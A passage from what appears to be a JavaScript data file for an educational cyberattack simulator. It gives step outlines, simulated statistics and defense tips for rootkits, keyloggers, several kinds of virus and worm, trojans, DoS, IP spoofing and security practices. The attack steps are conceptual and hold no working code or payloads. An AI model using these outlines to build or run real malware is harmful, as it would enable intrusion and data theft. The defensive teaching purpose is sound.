            { title: 'Kernel Access Gained', desc: 'Exploit or driver loading used to gain ring-0 privileges.' },
            { title: 'System Calls Hooked', desc: 'Rootkit hooks ReadFile, QueryProcess to intercept OS calls.' },
            { title: 'Processes Hidden', desc: 'Malicious processes removed from task manager listings.' },
            { title: 'Files Concealed', desc: 'Rootkit files hidden from directory listings and scanners.' },
            { title: 'Persistent Access', desc: 'Rootkit survives reboots; undetectable by user-mode tools.' },
        ],
        stats: [
            { label: 'Syscalls Hooked', value: '0', live: true },
            { label: 'Processes Hidden', value: '0', live: true },
            { label: 'Files Concealed', value: '0', live: true },
            { label: 'Detection Chance', value: '<1%', live: false },
        ],
        defense: [
            'Use Secure Boot and TPM to verify kernel integrity.',
            'Enable Driver Signature Enforcement on Windows.',
            'Use kernel-level security products (Hypervisor-based).',
            'Boot from trusted external media to scan for rootkits.',
            'Reimage compromised systems rather than attempting cleanup.',
        ],
        simulate: 'simulateRootkit',
    },
    {
        id: 'keylogger',
        name: 'Keylogger',
        icon: '⌨️',
        category: 'malware',
        severity: 'high',
        tags: ['keystroke', 'surveillance', 'spyware', 'credential-theft'],
        description: 'Keyloggers silently record every keystroke typed on a device, capturing passwords, credit card numbers, private messages, and sensitive data — all transmitted to the attacker in real-time or as periodic reports.',
        accent: '#ff00aa',
        accentDim: 'rgba(255,0,170,0.15)',
        steps: [
            { title: 'Keylogger Installed', desc: 'Trojan/malware drops keylogger module on target system.' },
            { title: 'Keyboard Hook Set', desc: 'Win32 SetWindowsHookEx intercepts all keyboard events.' },
            { title: 'Keystrokes Captured', desc: 'Every key typed recorded with timestamps and active window.' },
            { title: 'Data Aggregated', desc: 'Credentials, PINs, and messages compiled into log files.' },
            { title: 'Log Exfiltrated', desc: 'Keystroke logs sent to attacker via encrypted C2 channel.' },
        ],
        stats: [
            { label: 'Keys Captured', value: '0', live: true },
            { label: 'Credentials Found', value: '0', live: true },
            { label: 'Log Size', value: '0 KB', live: false },
            { label: 'Sessions Logged', value: '0', live: true },
        ],
        defense: [
            'Use virtual on-screen keyboards for sensitive inputs.',
            'Enable two-factor authentication (OTP changes every 30s).',
            'Use EDR/antivirus to detect keyboard hooking APIs.',
            'Encrypt disk to prevent offline keystroke log access.',
            'Audit installed software and running processes regularly.',
        ],
        simulate: 'simulateKeylogger',
    },
    {
        id: 'wateringhole',
        name: 'Watering Hole',
        icon: '🕳️',
        category: 'web',
        severity: 'critical',
        tags: ['targeted', 'apt', 'strategic-web', 'drive-by'],
        description: 'A watering hole attack compromises websites frequently visited by a specific target group (e.g., industry forums, gov portals). Unlike mass attacks, it patiently waits for victims to come to it — making it extremely effective for APT campaigns.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Target Group Profiled', desc: 'APT actor identifies websites frequented by target organization.' },
            { title: 'Watering Hole Compromised', desc: 'Legitimate industry website infected with exploit code.' },
            { title: 'Target Visits Site', desc: 'Employee visits their trusted industry resource normally.' },
            { title: 'Exploit Delivered', desc: 'Browser exploit silently executed; malware delivered.' },
            { title: 'Network Infiltrated', desc: 'Attacker pivots from employee device into corporate network.' },
        ],
        stats: [
            { label: 'Sites Compromised', value: '0', live: true },
            { label: 'Visitors Exposed', value: '0', live: true },
            { label: 'Targets Infected', value: '0', live: true },
            { label: 'Dwell Time', value: '0 days', live: false },
        ],
        defense: [
            'Use browser isolation technology for high-risk browsing.',
            'Implement DNS filtering to block known malicious domains.',
            'Patch browsers and plugins within 24 hours of release.',
            'Monitor egress traffic for C2 beaconing patterns.',
            'Conduct user awareness on watering hole risk indicators.',
        ],
        simulate: 'simulateWateringHole',
    },
    {
        id: 'emailvirus',
        name: 'Email Virus',
        icon: '✉️',
        category: 'virus',
        severity: 'high',
        tags: ['virus', 'email', 'attachment', 'macros', 'propagation'],
        description: 'An email virus propagates by sending copies of itself as attachments or links to all contacts in the victim\'s address book when executed. It infects files locally and uses standard mail client services to spread.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Inbound Phish', desc: 'Victim receives an email with an infected attachment (e.g. invoice.exe).' },
            { title: 'Execution Hook', desc: 'Victim runs the attachment, executing malicious loader code.' },
            { title: 'File Infection', desc: 'Virus infects and attaches itself to local executable files.' },
            { title: 'Harvesting Contacts', desc: 'Extracts contact email addresses from local address books and caches.' },
            { title: 'Self-Propagation', desc: 'Emails itself to all harvested contacts using SMTP APIs.' },
        ],
        stats: [
            { label: 'Emails Sent', value: '0', live: true },
            { label: 'Files Infected', value: '0', live: true },
            { label: 'Contacts Found', value: '0', live: true },
            { label: 'Mail Server Load', value: '0%', live: true },
        ],
        defense: [
            'Scan all incoming email attachments with email security gateways.',
            'Block executable file attachments (.exe, .scr, .bat) at the gateway.',
            'Keep email client software patched against execution flaws.',
            'Never open attachments from unverified or suspicious senders.',
            'Implement SPF, DKIM, and DMARC record checks to prevent spoofing.',
        ],
        simulate: 'simulateEmailVirus',
    },
    {
        id: 'parasiticvirus',
        name: 'Parasitic Virus',
        icon: '🦠',
        category: 'virus',
        severity: 'high',
        tags: ['virus', 'file-infector', 'executable', 'prepender', 'appender'],
        description: 'A parasitic virus attaches itself to legitimate executable files (.exe or .com). When the host program runs, the virus executes first, searching for and infecting other clean host files before passing control back to the original application.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Host Execution', desc: 'User launches an infected program, thinking it is clean.' },
            { title: 'Control Hijack', desc: 'Virus code runs first, taking CPU control immediately.' },
            { title: 'Directory Scan', desc: 'Searches local and network directories for target executables.' },
            { title: 'Binary Injection', desc: 'Injects virus code into targets and redirects their entry points.' },
            { title: 'Clean Handover', desc: 'Passes execution back to the host program so it runs normally.' },
        ],
        stats: [
            { label: 'Host Files Checked', value: '0', live: true },
            { label: 'Files Poisoned', value: '0', live: true },
            { label: 'Infection Rate', value: '0/s', live: true },
            { label: 'Target File Size', value: '0 KB', live: true },
        ],
        defense: [
            'Deploy File Integrity Monitoring (FIM) to detect executable modifications.',
            'Use secure code signing to verify binary origins.',
            'Configure directories with strict write-permission control.',
            'Run endpoint protection software with active heuristics.',
            'Compare file hashes (SHA-256) of critical system files regularly.',
        ],
        simulate: 'simulateParasiticVirus',
    },
    {
        id: 'memoryresidentvirus',
        name: 'Memory Resident Virus',
        icon: '💾',
        category: 'virus',
        severity: 'high',
        tags: ['virus', 'ram', 'resident', 'interrupts', 'persistence'],
        description: 'A memory resident virus loads into RAM upon execution and stays active even after its host program closes. It hooks system interrupts to dynamically infect any clean files accessed or executed by the operating system.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Loader Executed', desc: 'User executes an infected file, which runs and allocates memory.' },
            { title: 'RAM Allocation', desc: 'Virus copies its payload to a reserved RAM space, hiding its presence.' },
            { title: 'Interrupt Hooking', desc: 'Hooks file-open or directory-list OS interrupt vectors.' },
            { title: 'Active Interception', desc: 'Monitors disk requests; infects any accessed file in real-time.' },
            { title: 'RAM Persistence', desc: 'Stays resident in memory until system shutdown or memory purge.' },
        ],
        stats: [
            { label: 'RAM Occupied', value: '0 KB', live: true },
            { label: 'Interrupts Hooked', value: '0', live: true },
            { label: 'Intercepted Files', value: '0', live: true },
            { label: 'Detection Scans', value: '0', live: true },
        ],
        defense: [
            'Use EDR tools with active RAM monitoring and memory heuristics.',
            'Implement boot security systems like Secure Boot.',
            'Perform periodic system restarts to clear volatile memory.',
            'Configure driver signature validation to prevent kernel residency.',
            'Deploy security tools that analyze running process memory spaces.',
        ],
        simulate: 'simulateMemoryResidentVirus',
    },
    {
        id: 'bootsectorvirus',
        name: 'Boot Sector Virus',
        icon: '🥾',
        category: 'virus',
        severity: 'critical',
        tags: ['virus', 'boot', 'mbr', 'bios', 'early-execution'],
        description: 'A boot sector virus targets the Master Boot Record (MBR) or partition boot sector of storage drives. It loads before the operating system, allowing it to bypass traditional OS security layers and gain deep control.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'MBR Hijack', desc: 'Copies original MBR to a safe sector and overwrites Sector 0.' },
            { title: 'BIOS Load', desc: 'On reboot, BIOS reads malicious code from boot sector.' },
            { title: 'RAM Residency', desc: 'Virus allocates high memory, hooks interrupts, and resides in RAM.' },
            { title: 'OS Chainload', desc: 'Reads and executes original MBR sector to start the OS loader.' },
            { title: 'Stealth Execution', desc: 'Monitors disk access in OS background, infecting plugged-in media.' },
        ],
        stats: [
            { label: 'MBR Integrity', value: 'Valid', live: true },
            { label: 'Sectors Read', value: '0', live: true },
            { label: 'Media Scanned', value: '0', live: true },
            { label: 'IO Interceptions', value: '0', live: true },
        ],
        defense: [
            'Use UEFI Secure Boot with hardware trust verification (TPM).',
            'Enable BIOS write protection on the boot sector/MBR.',
            'Avoid booting from unknown external storage devices.',
            'Use modern partition formats like GPT instead of legacy MBR.',
            'Employ specialized boot loaders that perform pre-boot signature audits.',
        ],
        simulate: 'simulateBootSectorVirus',
    },
    {
        id: 'stealthvirus',
        name: 'Stealth Virus',
        icon: '🥷',
        category: 'virus',
        severity: 'high',
        tags: ['virus', 'stealth', 'anti-detection', 'hooking', 'spoofing'],
        description: 'A stealth virus hides its presence by intercepting read requests directed at infected files. When an AV scanner requests the file, the virus redirects the call to present the original uninfected data, evading detection.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Driver Loading', desc: 'Loads kernel or file system driver to monitor I/O requests.' },
            { title: 'System Call Hook', desc: 'Hooks read system calls (e.g. ReadFile) related to target executables.' },
            { title: 'AV Query Detection', desc: 'Detects scan request from antivirus software.' },
            { title: 'Payload Spoofing', desc: 'Temporarily swaps infected bytes with clean cache contents.' },
            { title: 'AV Clean Scan', desc: 'Sends clean data back; AV scanner reports zero threats.' },
        ],
        stats: [
            { label: 'System Hooks', value: '0', live: true },
            { label: 'Scanner Spoofs', value: '0', live: true },
            { label: 'Bytes Spoofed', value: '0 KB', live: true },
            { label: 'Infection Dwell', value: '0 days', live: true },
        ],
        defense: [
            'Boot from clean external media (PE USB) to perform offline AV scans.',
            'Deploy kernel integrity checks and monitor file driver tables.',
            'Use behavior-based EDR that analyzes process execution flow.',
            'Employ cryptographic file hashing independent of standard OS APIs.',
            'Analyze file system metadata variations that bypass standard read calls.',
        ],
        simulate: 'simulateStealthVirus',
    },
    {
        id: 'polymorphicvirus',
        name: 'Polymorphic Virus',
        icon: '🌈',
        category: 'virus',
        severity: 'high',
        tags: ['virus', 'polymorphic', 'encryption', 'mutation', 'heuristics'],
        description: 'A polymorphic virus alters its binary signature every time it replicates. By encrypting its core payload with a different key for each infection and creating a dynamically modified decryption stub, it evades signature-based scanner detection.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Replication Start', desc: 'Virus prepares to copy itself to a new target host file.' },
            { title: 'Key Generation', desc: 'Generates a unique, randomized encryption key.' },
            { title: 'Payload Encryption', desc: 'Encrypts the main virus body using the new key.' },
            { title: 'Stub Mutation', desc: 'Generates a dynamically varied decryptor routine (stub).' },
            { title: 'Modified Write', desc: 'Writes the unique stub + encrypted body to disk, creating a new signature.' },
        ],
        stats: [
            { label: 'Signatures Created', value: '0', live: true },
            { label: 'Keys Generated', value: '0', live: true },
            { label: 'Decryptor Stubs', value: '0', live: true },
            { label: 'Scanner Misses', value: '0', live: true },
        ],
        defense: [
            'Use heuristic-based scanning that matches abstract code patterns.',
            'Run antivirus in sandbox environments to emulate stub execution.',
            'Implement behavior monitoring to catch the payload after decryption.',
            'Use advanced signature detection like generic decryption emulation.',
            'Apply machine learning models trained on structural entropy differences.',
        ],
        simulate: 'simulatePolymorphicVirus',
    },
    {
        id: 'metamorphicvirus',
        name: 'Metamorphic Virus',
        icon: '🧬',
        category: 'virus',
        severity: 'critical',
        tags: ['virus', 'metamorphic', 'obfuscation', 'reassembly', 'rewriting'],
        description: 'A metamorphic virus rewrites its own binary structure completely with each infection. Using dead-code insertion, register swapping, and instruction transposition, it creates a unique file with no signatures, but identical logic.',
        accent: '#ff3b3b',
        accentDim: 'rgba(255,59,59,0.15)',
        steps: [
            { title: 'Self-Analysis', desc: 'Virus decompiles its own binary into instruction representations.' },
            { title: 'Register Swapping', desc: 'Swaps processor registers (e.g. using ESI instead of EDI).' },
            { title: 'Instruction Morph', desc: 'Swaps instructions (e.g. SUB EAX, EAX replaced with XOR EAX, EAX).' },
            { title: 'Dead-Code Insertion', desc: 'Inserts functional NOP instructions or junk jumps to shift blocks.' },
            { title: 'Binary Compilation', desc: 'Recompiles the assembly code into a completely unique executable.' },
        ],
        stats: [
            { label: 'Rewrite Cycles', value: '0', live: true },
            { label: 'Junk Codes', value: '0 lines', live: true },
            { label: 'Swaps Applied', value: '0', live: true },
            { label: 'Sig Match Rate', value: '0%', live: true },
        ],
        defense: [
            'Employ endpoint security with execution flow graph tracking.',
            'Monitor system APIs and detect malicious behavioral patterns.',
            'Perform runtime memory profiling instead of disk signature checks.',
            'Use advanced sandboxing that detects logical anomalies.',
            'Keep all network detection filters active to block download traffic.',
        ],
        simulate: 'simulateMetamorphicVirus',
    },
    {
        id: 'wormgeneral',
        name: 'Network Worm',
        icon: '🪱',
        category: 'worm',
        severity: 'critical',
        tags: ['worm', 'network', 'exploit', 'lateral-movement', 'self-contained'],
        description: 'A network worm is a standalone program that self-replicates across computer networks. By exploiting vulnerabilities (like SMB or RPC flaws) in active network services, it copies its binary directly to other machines without user action.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'IP Scanning', desc: 'Scans network ranges (local and public) for active machines.' },
            { title: 'Port Probing', desc: 'Probes systems for vulnerable listening services (e.g. port 445).' },
            { title: 'Exploitation', desc: 'Fires network exploit payload (e.g., EternalBlue) at target services.' },
            { title: 'Self-Transfer', desc: 'Establishes a connection to copy and write its executable to the host.' },
            { title: 'Spawning execution', desc: 'Triggers remote execution of the copy, which starts scanning.' },
        ],
        stats: [
            { label: 'Hosts Scanned', value: '0', live: true },
            { label: 'Exploits Sent', value: '0', live: true },
            { label: 'Infections Spawns', value: '0', live: true },
            { label: 'Bandwidth Saturated', value: '0 Mbps', live: true },
        ],
        defense: [
            'Apply OS security updates immediately, prioritizing SMB and RPC services.',
            'Enable local host firewalls and block unsolicited inbound ports.',
            'Implement network segmentation to contain propagation.',
            'Disable legacy protocols like SMBv1, NetBIOS, and Telnet.',
            'Use network intrusion prevention systems (IPS) to detect scanning.',
        ],
        simulate: 'simulateWormGeneral',
    },
    {
        id: 'emailworm',
        name: 'Email Worm',
        icon: '📬',
        category: 'worm',
        severity: 'high',
        tags: ['worm', 'email', 'social-engineering', 'broadcasting', 'outbox'],
        description: 'An email worm propagates by automatically mass-mailing copies of itself to contacts found on infected hosts. It utilizes local mail folders and SMTP services to send outbound emails with enticing attachments or links.',
        accent: '#ffaa00',
        accentDim: 'rgba(255,170,0,0.15)',
        steps: [
            { title: 'Contact Harvest', desc: 'Scans registry, cache, and email files for valid addresses.' },
            { title: 'Server Access', desc: 'Identifies local mail client configurations and mail servers.' },
            { title: 'Email Assembly', desc: 'Drafts emails using social engineering templates and sender spoofing.' },
            { title: 'Outbound Blast', desc: 'Sends emails containing infected files (e.g., update.pdf.exe) to all contacts.' },
            { title: 'Remote Execution', desc: 'Recipient opens mail and runs the file, repeating propagation.' },
        ],
        stats: [
            { label: 'Addresses Scraped', value: '0', live: true },
            { label: 'Mails Dispatched', value: '0', live: true },
            { label: 'SMTP Connections', value: '0', live: true },
            { label: 'Inbox Infects', value: '0', live: true },
        ],
        defense: [
            'Configure strict SPF, DKIM, and DMARC checks on email servers.',
            'Deploy email threat filters that scan and block double extensions.',
            'Limit outbound SMTP requests from endpoint workstations.',
            'Train employees on identifying unsolicited file attachments.',
            'Run endpoint protection that monitors execution from mail clients.',
        ],
        simulate: 'simulateEmailWorm',
    },
    {
        id: 'trojangeneral',
        name: 'Trojan Disguise',
        icon: '🎁',
        category: 'trojan',
        severity: 'high',
        tags: ['trojan', 'social-engineering', 'disguise', 'wrapper', 'consent'],
        description: 'A Trojan disguise presents itself as a useful, safe utility or file, gaining user trust to secure installation consent. Once launched, it installs the normal application while secretly deploying malicious processes in the background.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Wrapper packaging', desc: 'Attacker bundles malware inside a clean installer (e.g. PDF reader).' },
            { title: 'Malicious Upload', desc: 'Publishes file on unofficial sites or cracks platforms.' },
            { title: 'User Download', desc: 'User downloads application, thinking it is legitimate.' },
            { title: 'Silent Installer', desc: 'Run installer; user gets PDF reader, but malware runs in background.' },
            { title: 'Backdoor Setup', desc: 'Trojan registers a hidden startup entry and connects to C2.' },
        ],
        stats: [
            { label: 'Disguise Rating', value: 'Excellent', live: true },
            { label: 'Downloads Triggered', value: '0', live: true },
            { label: 'Install Consent', value: 'Granted', live: true },
            { label: 'Hidden Processes', value: '0', live: true },
        ],
        defense: [
            'Only download software from official, vetted developer portals.',
            'Verify code-signing certificates before authorizing installer prompts.',
            'Implement administrative restrictions (UAC) on user accounts.',
            'Use antivirus software with real-time wrapper unpacking.',
            'Monitor autorun registry locations for unexpected startup entries.',
        ],
        simulate: 'simulateTrojanGeneral',
    },
    {
        id: 'passivetrojan',
        name: 'Passive Trojan (Listener)',
        icon: '🚪',
        category: 'trojan',
        severity: 'high',
        tags: ['trojan', 'backdoor', 'listener', 'port-binding', 'incoming'],
        description: 'A passive Trojan establishes a port listener on the infected computer, waiting silently for the attacker to initiate a network connection. Since it creates no outbound traffic, it easily bypasses standard egress monitoring systems.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Port Binding', desc: 'Backdoor runs and binds a listening socket to a specific local port.' },
            { title: 'Firewall Bypass', desc: 'Modifies local system firewall rules to allow inbound requests on that port.' },
            { title: 'Passive Listening', desc: 'Waits silently on the socket, generating zero active network traffic.' },
            { title: 'Attacker Connection', desc: 'Attacker discovers IP and connects directly to the listening port.' },
            { title: 'Remote Shell', desc: 'Accepts connection and spawns a command shell with user privileges.' },
        ],
        stats: [
            { label: 'Listening Ports', value: '0', live: true },
            { label: 'Rules Injected', value: '0', live: true },
            { label: 'Egress Traffic', value: '0 B', live: true },
            { label: 'Inbound Conns', value: '0', live: true },
        ],
        defense: [
            'Deploy host firewalls that block all unsolicited inbound network requests.',
            'Perform regular port auditing and scan with tools like netstat.',
            'Configure switches with ingress traffic filtering policies.',
            'Utilize Intrusion Detection Systems (IDS) to track unsolicited local connections.',
            'Keep system firewalls updated and limit user privilege to edit rule exceptions.',
        ],
        simulate: 'simulatePassiveTrojan',
    },
    {
        id: 'activetrojan',
        name: 'Active Trojan (Reverse Shell)',
        icon: '📡',
        category: 'trojan',
        severity: 'critical',
        tags: ['trojan', 'active', 'reverse-shell', 'beaconing', 'c2-server'],
        description: 'An active Trojan initiates outbound network connections to an attacker\'s Command and Control (C2) server. This reverse connection bypasses inbound firewall rules, enabling full remote access from a public server.',
        accent: '#8b5cf6',
        accentDim: 'rgba(139,92,246,0.15)',
        steps: [
            { title: 'Persist Registry', desc: 'Registers startup entries to run background processes at boot.' },
            { title: 'C2 Resolution', desc: 'Queries DNS for C2 domain, bypassing static IP blocks via DGA.' },
            { title: 'Reverse Connect', desc: 'Triggers outbound connection (HTTP/HTTPS) to the C2 server.' },
            { title: 'Heartbeat Beacon', desc: 'Sends periodic heartbeat signals to the server requesting tasks.' },
            { title: 'Task Executed', desc: 'Receives instructions (shell, exfiltration) and transmits data.' },
        ],
        stats: [
            { label: 'C2 Heartbeats', value: '0', live: true },
            { label: 'Egress Port', value: 'HTTPS (443)', live: true },
            { label: 'Beacon Interval', value: '5s', live: true },
            { label: 'Data Transpatched', value: '0 KB', live: true },
        ],
        defense: [
            'Configure egress filtering to restrict outbound traffic to approved ports.',
            'Analyze network traffic for periodic, automated beaconing signatures.',
            'Implement SSL/TLS decryption to inspect outgoing web communications.',
            'Integrate reputation threat lists to block communication with known C2 IPs.',
            'Perform continuous threat hunting for anomalous system processes.',
        ],
        simulate: 'simulateActiveTrojan',
    },
    {
        id: 'dos',
        name: 'DoS Attack',
        icon: '🚫',
        category: 'network',
        severity: 'high',
        tags: ['flood', 'single-source', 'availability', 'bandwidth'],
        description: 'A Denial of Service (DoS) attack originates from a single machine that floods a target server with an overwhelming volume of TCP SYN, UDP, or HTTP requests, exhausting its resources and rendering the service unavailable to legitimate users — unlike DDoS, no botnet is required.',
        accent: '#ff6b35',
        accentDim: 'rgba(255,107,53,0.15)',
        steps: [
            { title: 'Target Identified', desc: 'Attacker identifies the target server IP address and open ports.' },
            { title: 'SYN Flood Initiated', desc: 'Single machine sends thousands of TCP SYN packets per second.' },
            { title: 'Half-Open Connections', desc: 'Server allocates resources for each SYN but never gets ACK back.' },
            { title: 'Resource Exhaustion', desc: 'Connection table overflows — memory and CPU spike to 100%.' },
            { title: 'Service Denial', desc: 'Legitimate users receive timeouts. Service is effectively offline.' },
        ],
        stats: [
            { label: 'SYN Packets/sec', value: '0', live: true },
            { label: 'Half-Open Conns', value: '0', live: true },
            { label: 'Server Memory', value: '0%', live: false },
            { label: 'Server Status', value: 'ONLINE', live: false },
        ],
        defense: [
            'Enable SYN cookies on the server to handle half-open connections efficiently.',
            'Configure firewall rate-limiting rules per source IP.',
            'Deploy an Intrusion Prevention System (IPS) with flood detection.',
            'Set TCP connection timeouts to reclaim resources quickly.',
            'Use network monitoring to detect abnormal single-source traffic spikes.',
        ],
        simulate: 'simulateDoS',
    },
    {
        id: 'ip-spoofing',
        name: 'IP Spoofing',
        icon: '🎭',
        category: 'network',
        severity: 'high',
        tags: ['spoofing', 'impersonation', 'packet-forging', 'network'],
        description: 'IP Spoofing is a technique where an attacker forges the source IP address in packet headers to impersonate a trusted host, bypass IP-based access controls, or conceal identity during attacks like DDoS amplification and Man-in-the-Middle.',
        accent: '#e040fb',
        accentDim: 'rgba(224,64,251,0.15)',
        steps: [
            { title: 'Trusted Host Identified', desc: 'Attacker discovers the IP address of a host trusted by the target.' },
            { title: 'Packet Header Forged', desc: 'Raw packets are crafted with the trusted host\'s IP as the source.' },
            { title: 'Spoofed Packets Sent', desc: 'Forged packets are transmitted to the target server.' },
            { title: 'Trust Exploited', desc: 'Target accepts packets as legitimate — ACL/firewall rules bypassed.' },
            { title: 'Attack Achieved', desc: 'Attacker gains unauthorized access or amplifies DDoS traffic.' },
        ],
        stats: [
            { label: 'Packets Forged', value: '0', live: true },
            { label: 'Spoofed Source IP', value: '—', live: false },
            { label: 'Firewall Bypassed', value: 'No', live: false },
            { label: 'Trust Level', value: '0%', live: false },
        ],
        defense: [
            'Implement ingress filtering (BCP 38/RFC 2827) at network borders.',
            'Use cryptographic authentication (IPsec) instead of IP-based trust.',
            'Enable Reverse Path Forwarding (RPF) checks on routers.',
            'Avoid relying on IP addresses for authentication or access control.',
            'Deploy deep packet inspection (DPI) to detect forged headers.',
        ],
        simulate: 'simulateIPSpoofing',
    },
    {
        id: 'vuln-scan',
        name: 'Vulnerability Scanning',
        icon: '🔍',
        category: 'security',
        severity: 'medium',
        tags: ['scanning', 'reconnaissance', 'CVE', 'audit'],
        description: 'Vulnerability Scanning is the automated process of probing systems, networks, and applications for known security weaknesses (CVEs), misconfigurations, and outdated software. Attackers use it for reconnaissance; defenders use it for hardening.',
        accent: '#00e5ff',
        accentDim: 'rgba(0,229,255,0.15)',
        steps: [
            { title: 'Target Enumeration', desc: 'Scanner discovers live hosts and open ports on the target network.' },
            { title: 'Service Fingerprinting', desc: 'Identifies running services, versions, and operating systems.' },
            { title: 'CVE Database Lookup', desc: 'Compares discovered services against known vulnerability databases.' },
            { title: 'Vulnerability Detected', desc: 'Critical and high-severity CVEs flagged with CVSS scores.' },
            { title: 'Report Generated', desc: 'Full scan report with prioritized remediation steps is produced.' },
        ],
        stats: [
            { label: 'Ports Scanned', value: '0', live: true },
            { label: 'Services Found', value: '0', live: true },
            { label: 'Vulns Detected', value: '0', live: true },
            { label: 'Critical CVEs', value: '0', live: true },
        ],
        defense: [
            'Run authenticated vulnerability scans regularly (weekly/monthly).',
            'Prioritize remediation by CVSS score and exploit availability.',
            'Keep all software and firmware updated to latest stable versions.',
            'Use a vulnerability management platform (e.g., Nessus, Qualys, OpenVAS).',
            'Integrate scanning into CI/CD pipelines for early detection.',
        ],
        simulate: 'simulateVulnScan',
    },
    {
        id: 'patching',
        name: 'Security Patching',
        icon: '🩹',
        category: 'security',
        severity: 'low',
        tags: ['patch', 'update', 'remediation', 'hardening'],
        description: 'Security Patching is the process of applying vendor-released fixes to close known vulnerabilities in operating systems, applications, and firmware. Timely patching is the single most effective defense against exploitation of known CVEs.',
        accent: '#39ff14',
        accentDim: 'rgba(57,255,20,0.15)',
        steps: [
            { title: 'Vulnerability Identified', desc: 'Critical CVE detected during a vulnerability scan or advisory alert.' },
            { title: 'Patch Available', desc: 'Vendor releases a security update addressing the vulnerability.' },
            { title: 'Patch Tested', desc: 'Update is deployed to a staging environment for compatibility testing.' },
            { title: 'Patch Deployed', desc: 'Approved patch is rolled out across all affected production systems.' },
            { title: 'Verification Complete', desc: 'Post-patch scan confirms the vulnerability is remediated.' },
        ],
        stats: [
            { label: 'Systems Scanned', value: '0', live: true },
            { label: 'Patches Available', value: '0', live: true },
            { label: 'Patches Applied', value: '0', live: true },
            { label: 'Systems Secured', value: '0', live: true },
        ],
        defense: [
            'Establish a patch management policy with SLA-based timelines.',
            'Automate patch deployment with tools like WSUS, SCCM, or Ansible.',
            'Test patches in staging before production rollout.',
            'Maintain an asset inventory to ensure complete coverage.',
            'Monitor vendor advisories and CISA KEV for urgent patches.',
        ],
        simulate: 'simulatePatching',
    },
    {
        id: 'pentest',
        name: 'Penetration Testing',
        icon: '🧪',
        category: 'security',
        severity: 'high',
        tags: ['pentest', 'ethical-hacking', 'exploit', 'red-team'],
        description: 'Penetration Testing (pentesting) is an authorized, simulated cyber attack on a system to evaluate its security posture. Ethical hackers use the same tools and techniques as real attackers to find and exploit vulnerabilities before malicious actors do.',
        accent: '#ff9100',
        accentDim: 'rgba(255,145,0,0.15)',
        steps: [
            { title: 'Scope & Reconnaissance', desc: 'Define targets, gather OSINT, map the attack surface.' },
            { title: 'Scanning & Enumeration', desc: 'Run Nmap, Nikto, and directory brute-force to find entry points.' },
            { title: 'Exploitation', desc: 'Leverage discovered vulnerabilities to gain initial access.' },
            { title: 'Privilege Escalation', desc: 'Escalate from low-privilege user to root/admin access.' },
            { title: 'Report & Remediation', desc: 'Document findings with proof-of-concept and remediation advice.' },
        ],
        stats: [
            { label: 'Hosts Discovered', value: '0', live: true },
            { label: 'Exploits Attempted', value: '0', live: true },
            { label: 'Shells Gained', value: '0', live: true },
            { label: 'Privesc Level', value: 'None', live: false },
        ],
        defense: [
            'Conduct penetration tests annually and after major changes.',
            'Use both automated tools and manual testing for thorough coverage.',
            'Engage third-party pentest firms for unbiased assessments.',
            'Remediate all critical and high findings before retesting.',
            'Integrate pentest results into the security improvement roadmap.',
        ],
        simulate: 'simulatePentest',
    },
    {
        id: 'firewall',
        name: 'Next-Gen Firewall',
        icon: '🧱',
        category: 'security',
        severity: 'low',
        tags: ['firewall', 'packet-filtering', 'inspection', 'access-control'],
        description: 'A Next-Generation Firewall (NGFW) monitors and filters incoming and outgoing network traffic based on stateful security rules, protocol definitions, and deep packet inspection (DPI) to block malicious traffic.',
        accent: '#e53935',
        accentDim: 'rgba(229,57,53,0.15)',
        steps: [
            { title: 'Rule Evaluation', desc: 'Inspects packet headers (source, destination, port) against the active ACL.' },
            { title: 'Deep Packet Inspection', desc: 'Analyzes packet payloads to identify hidden application-layer threat signatures.' },
            { title: 'Stateful Tracking', desc: 'Verifies if packets belong to an existing, established connection.' },
            { title: 'Threat Blocked', desc: 'Drops anomalous packets, spoofed traffic, and unapproved protocol attempts.' },
            { title: 'Clean Traffic Passed', desc: 'Forwards legitimate packets safely to the internal network destination.' },
        ],
        stats: [
            { label: 'Packets Inspected', value: '0', live: true },
            { label: 'Threats Blocked', value: '0', live: true },
            { label: 'Active Sessions', value: '0', live: true },
            { label: 'CPU Usage', value: '0%', live: false },
        ],
        defense: [
            'Maintain a strict default-deny inbound and outbound traffic policy.',
            'Regularly audit and clean up outdated or redundant firewall rules.',
            'Enable application-aware scanning and TLS decryption for deep visibility.',
            'Integrate threat intelligence feeds to block known malicious IPs automatically.',
            'Configure firewall high-availability pairs to prevent single points of failure.',
        ],
        simulate: 'simulateFirewall',
    },
    {
        id: 'ids-ips',
        name: 'Intrusion Detection System',
        icon: '🚨',
        category: 'security',
        severity: 'medium',
        tags: ['ids', 'ips', 'signature-matching', 'anomalous'],
        description: 'An Intrusion Detection and Prevention System (IDS/IPS) monitors network traffic for signatures of known cyber attacks, vulnerabilities, and anomalous traffic patterns, alerting security teams and actively dropping connections.',
        accent: '#ff9800',
        accentDim: 'rgba(255,152,0,0.15)',
        steps: [
            { title: 'Traffic Mirroring', desc: 'Captures and monitors network packets via a network TAP/SPAN port.' },
            { title: 'Signature Matching', desc: 'Scans traffic payloads against a database of thousands of known attack patterns.' },
            { title: 'Heuristic Profiling', desc: 'Compares current traffic behavior against baseline network statistics.' },
            { title: 'Alert Generated', desc: 'Creates high-priority security logs detailing the threat and target.' },
            { title: 'Active Mitigation', desc: 'IPS drops offending packets and dynamically updates firewall blocklists.' },
        ],
        stats: [
            { label: 'Gbps Monitored', value: '0.0 Gbps', live: false },
            { label: 'Signatures Loaded', value: '18,500', live: false },
            { label: 'Threat Alerts', value: '0', live: true },
